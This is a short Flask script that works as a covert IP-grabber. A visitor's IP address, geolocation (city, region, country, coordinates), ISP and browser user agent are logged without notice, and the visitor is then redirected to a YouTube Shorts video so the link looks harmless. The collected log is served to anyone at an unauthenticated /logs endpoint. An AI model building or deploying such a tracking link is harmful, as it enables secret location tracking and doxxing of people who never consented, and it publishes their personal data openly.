from flask import Flask, request, redirect, Response
import requests
from datetime import datetime
import os

app = Flask(__name__)

def get_location(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        return {
            "ip": ip,
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country"),
            "location": data.get("loc"),
            "isp": data.get("org")
        }
    except:
        return {
            "ip": ip,
            "city": None,
            "region": None,
            "country": None,
            "location": None,
            "isp": None
        }

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    info = get_location(ip)

    log_entry = (
        f"{datetime.now()} | IP: {info['ip']} | "
        f"City: {info['city']} | Region: {info['region']} | "
        f"Country: {info['country']} | Location: {info['location']} | "
        f"ISP: {info['isp']} | Device: {user_agent}"
    )

    with open("logs.txt", "a") as file:
        file.write(log_entry + "\n")

    return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")

@app.route('/logs')
def logs():
    if not os.path.exists("logs.txt"):
        return "No logs yet."

    with open("logs.txt", "r") as file:
        content = file.read()

    return Response(content, mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
